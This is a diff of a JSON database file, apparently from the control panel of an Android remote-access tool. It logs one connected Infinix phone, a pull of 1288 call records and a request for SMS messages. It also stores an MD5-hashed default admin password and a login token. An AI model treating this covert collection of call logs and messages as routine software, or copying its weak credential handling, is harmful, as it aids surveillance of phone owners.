@@ -2,9 +2,61 @@
   "admin": {
     "username": "admin",
     "password": "21232f297a57a5a743894a0e4a801fc3",
-    "loginToken": "",
-    "logs": [],
+    "loginToken": "e6753c915056b9a2318405a56b18d9b4",
+    "logs": [
+      {
+        "time": "2026-05-13T01:11:17.749Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2026-05-13T01:11:25.696Z",
+        "type": "INFO",
+        "message": "4466eb268efb1663 Connected"
+      },
+      {
+        "time": "2026-05-13T01:12:12.305Z",
+        "type": "INFO",
+        "message": "Requested 0xCL From 4466eb268efb1663"
+      },
+      {
+        "time": "2026-05-13T01:12:17.139Z",
+        "type": "SUCCESS",
+        "message": "4466eb268efb1663 Call Log Updated - 1288 New Calls"
+      },
+      {
+        "time": "2026-05-13T01:12:20.177Z",
+        "type": "INFO",
+        "message": "Requested 0xCL From 4466eb268efb1663"
+      },
+      {
+        "time": "2026-05-13T01:12:20.436Z",
+        "type": "SUCCESS",
+        "message": "4466eb268efb1663 Call Log Updated - 0 New Calls"
+      },
+      {
+        "time": "2026-05-13T01:12:36.339Z",
+        "type": "INFO",
+        "message": "Requested 0xSM From 4466eb268efb1663"
+      }
+    ],
     "ipLog": []
   },
-  "clients": []
+  "clients": [
+    {
+      "clientID": "4466eb268efb1663",
+      "firstSeen": "2026-05-13T01:11:25.665Z",
+      "lastSeen": "2026-05-13T01:11:25.665Z",
+      "isOnline": true,
+      "dynamicData": {
+        "clientIP": "127.0.0.1",
+        "clientGeo": {},
+        "device": {
+          "model": "Infinix X6832",
+          "manufacture": "INFINIX",
+          "version": "13"
+        }
+      }
+    }
+  ]
 }
